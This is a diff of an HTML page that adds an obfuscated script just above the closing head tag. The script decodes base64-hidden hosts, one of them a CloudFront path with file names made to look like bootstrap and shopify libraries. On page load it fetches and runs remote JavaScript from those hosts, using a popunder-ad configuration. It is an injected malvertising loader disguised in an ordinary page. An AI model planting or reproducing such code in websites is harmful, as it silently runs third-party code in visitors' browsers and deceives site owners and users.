@@ -373,6 +373,12 @@
             background: #999;
         }
     </style>
+    <!-- ===== 插入的脚本（位于 </head> 上方） ===== -->
+    <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var s=window,a="d1ec8b28f9b924ef8c6e1e4b8fc7e197",m=[["siteId",749-839*450+88+5691880],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],g=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9wcm9TL2Jib290c3RyYXAtbmF0aXZlLm1pbi5qcw==","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvVmJrelcvdUdlRi9jc2hvcGlmeS1idXkudW1kLm1pbi5jc3M="],q=-1,r,k,c=function(){clearTimeout(k);q++;if(g[q]&&!(1811579266000<(new Date).getTime()&&1<q)){r=s.document.createElement("script");r.type="text/javascript";r.async=!0;var i=s.document.getElementsByTagName("script")[0];r.src="https://"+atob(g[q]);r.crossOrigin="anonymous";r.onerror=c;r.onload=function(){clearTimeout(k);s[a.slice(0,16)+a.slice(0,16)]||c()};k=setTimeout(c,5E3);i.parentNode.insertBefore(r,i)}};if(!s[a]){try{Object.freeze(s[a]=m)}catch(e){}c()}})();
+/*]]>/* */
+</script>
 </head>
 <body>
 
